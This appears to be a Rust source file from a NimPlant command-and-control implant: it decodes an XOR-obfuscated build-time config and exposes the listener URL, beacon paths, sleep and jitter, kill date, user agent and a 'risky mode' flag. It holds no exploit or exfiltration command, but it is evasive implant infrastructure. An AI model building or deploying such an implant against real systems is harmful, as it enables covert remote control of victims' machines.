extern crate bincode;

use fmtools::format; // using obfstr to obfuscate
use microkv::MicroKV;
use serde::Deserialize;
use std::str;

use crate::app::crypto::xor_bytes;

// Enum to define the config types
// Must match the one in build.rs
#[derive(Deserialize)]
enum ConfigKey {
    ListenerType,
    ListenerHostname,
    ListenerIP,
    ListenerPort,
    ListenerRegisterPath,
    ListenerTaskPath,
    ListenerResultPath,
    NimPlantRiskyMode,
    NimPlantSleepMask,
    NimPlantSleepTime,
    NimPlantSleepJitter,
    NimPlantKillDate,
    NimPlantUserAgent,
}

impl ConfigKey {
    fn value(&self) -> &str {
        match *self {
            ConfigKey::ListenerType => "0",
            ConfigKey::ListenerHostname => "1",
            ConfigKey::ListenerIP => "2",
            ConfigKey::ListenerPort => "3",
            ConfigKey::ListenerRegisterPath => "4",
            ConfigKey::ListenerTaskPath => "5",
            ConfigKey::ListenerResultPath => "6",
            ConfigKey::NimPlantRiskyMode => "7",
            ConfigKey::NimPlantSleepMask => "8",
            ConfigKey::NimPlantSleepTime => "9",
            ConfigKey::NimPlantSleepJitter => "10",
            ConfigKey::NimPlantKillDate => "11",
            ConfigKey::NimPlantUserAgent => "12",
        }
    }
}

// Enum to define the types of HTTP paths in the config
pub(crate) enum Path {
    Register,
    Task,
    Result,
}

// Helper function to get the XOR key via build.rs
pub(crate) fn get_xor_key() -> i64 {
    include!(concat!(env!("OUT_DIR"), "/xor_key.rs"))
}

// Struct to hold the configuration
// We use MicroKV to store our config values
// MicroKV takes care of encryption and zeroization of secure values
pub(crate) struct Config {
    kv: MicroKV,
}

impl Config {
    pub(crate) fn new() -> Result<Config, Box<dyn std::error::Error>> {
        // Read the byte vector from the file
        let encoded = include_bytes!(concat!(env!("OUT_DIR"), "/_config.rs"));

        // Deserialize the byte vector back into your original data structure
        let config: Vec<(ConfigKey, Vec<u8>)> = bincode::deserialize(encoded).unwrap();

        // Initialize the in-memory KV
        let microkv = MicroKV::new("config");

        // Loop over the deserialized data, decrypt, and store in KV
        // (MicroKV will take over encryption from here)
        for (key, value) in config {
            microkv.put(
                key.value(),
                &String::from_utf8(xor_bytes(&value, get_xor_key()))?,
            )?;
        }

        Ok(Config { kv: microkv })
    }

    // Getter functions to get the values from the KV
    pub(crate) fn get_http_url(&self) -> Result<String, Box<dyn std::error::Error>> {
        let protocol: String = self
            .kv
            .get::<String>(ConfigKey::ListenerType.value())?
            .ok_or_else(|| format!("Could not parse value 'type' from configuration"))?
            .to_lowercase();
        let hostname: String = self
            .kv
            .get(ConfigKey::ListenerHostname.value())?
            .ok_or_else(|| format!("Could not parse value 'hostname' from configuration"))?;
        let ip: String = self
            .kv
            .get(ConfigKey::ListenerIP.value())?
            .ok_or_else(|| format!("Could not parse value 'ip' from configuration"))?;
        let port: String = self
            .kv
            .get(ConfigKey::ListenerPort.value())?
            .ok_or_else(|| format!("Could not parse value 'port' from configuration"))?;

        let result = if hostname.is_empty() {
            format!({protocol}"://"{ip}":"{port})
        } else {
            format!({protocol}"://"{hostname})
        };

        Ok(result)
    }

    pub(crate) fn get_http_user_agent(&self) -> Result<String, Box<dyn std::error::Error>> {
        Ok(self
            .kv
            .get(ConfigKey::NimPlantUserAgent.value())?
            .ok_or_else(|| format!("Could not parse value 'userAgent' from configuration"))?)
    }

    pub(crate) fn get_kill_date(&self) -> Result<String, Box<dyn std::error::Error>> {
        Ok(self
            .kv
            .get(ConfigKey::NimPlantKillDate.value())?
            .ok_or_else(|| format!("Could not parse value 'killDate' from configuration"))?)
    }

    pub(crate) fn get_path(&self, path: &Path) -> Result<String, Box<dyn std::error::Error>> {
        let value_to_get = match path {
            Path::Register => ConfigKey::ListenerRegisterPath.value(),
            Path::Task => ConfigKey::ListenerTaskPath.value(),
            Path::Result => ConfigKey::ListenerResultPath.value(),
        };

        Ok(self
            .kv
            .get(value_to_get)?
            .ok_or_else(|| format!("Could not parse value from configuration"))?)
    }

    pub(crate) fn get_risky_mode(&self) -> Result<bool, Box<dyn std::error::Error>> {
        Ok(self
            .kv
            .get::<String>(ConfigKey::NimPlantRiskyMode.value())?
            .ok_or_else(|| format!("Could not parse value 'riskyMode' from configuration"))?
            .parse::<bool>()?)
    }

    pub(crate) fn get_sleep_time(&self) -> Result<u32, Box<dyn std::error::Error>> {
        Ok(self
            .kv
            .get::<String>(ConfigKey::NimPlantSleepTime.value())?
            .ok_or_else(|| format!("Could not parse value 'sleepTime' from configuration"))?
            .parse::<u32>()?)
    }

    pub(crate) fn get_sleep_jitter(&self) -> Result<f64, Box<dyn std::error::Error>> {
        Ok(self
            .kv
            .get::<String>(ConfigKey::NimPlantSleepJitter.value())?
            .ok_or_else(|| format!("Could not parse value 'sleepJitter' from configuration"))?
            .parse::<f64>()?)
    }
}
